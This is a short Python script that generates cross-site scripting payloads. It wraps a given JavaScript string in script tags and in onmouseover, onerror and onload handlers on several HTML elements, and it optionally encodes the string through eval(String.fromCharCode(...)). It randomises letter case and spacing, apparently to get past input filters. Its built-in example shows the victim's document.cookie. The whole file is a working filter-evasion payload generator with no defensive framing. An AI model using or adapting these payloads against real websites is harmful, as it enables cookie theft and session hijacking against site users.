import random
def randomurl():
    chars='abcdefghijklmnopqrstuvwxyz'
    length=random.randint(5, 20)
    choice=random.choice
    return ''.join(choice(chars) for i in range(length))+'.com'
    
def xssencode(javascript):
    javascript2='eval(String.fromCharCode(%s))' % ','.join(str(ord(i)) for i in javascript)
    for js in [javascript, javascript2]:
        options=['<script>{}</script>',
         '<a onmouseover="{}">%s</a>' % (' '*random.randint(0, 250)),
         '<dev onmouseover="{}">%s</dev>' % (' '*random.randint(0, 250)),
         '<span onmouseover="{}">%s</span>' % (' '*random.randint(0, 250)),
         '<img onmouseover="{}" src="#"/>',
         '<img onmouseover="{}"/>',
         '<img onerror="{}" src="/"/>',
         '<img onerror="{}" src="%s"/>' % randomurl(),
         '<iframe onmouseover="{}" src="#"></iframe>',
         '<body onload={}>',]
        for i in options:
            i=''.join(a.upper() if random.randint(0,1) else a.lower() for a in i)
            i=''.join(a if random.randint(0,1) or a!='>' else ' >' for a in i)
            i=''.join(a if random.randint(0,1) or a!=' ' else '  ' for a in i)
            yield i.format(js)
if __name__=='__main__':
    attack="alert('XSS: '+document.cookie)"
    print('\n'.join(xssencode(attack)))
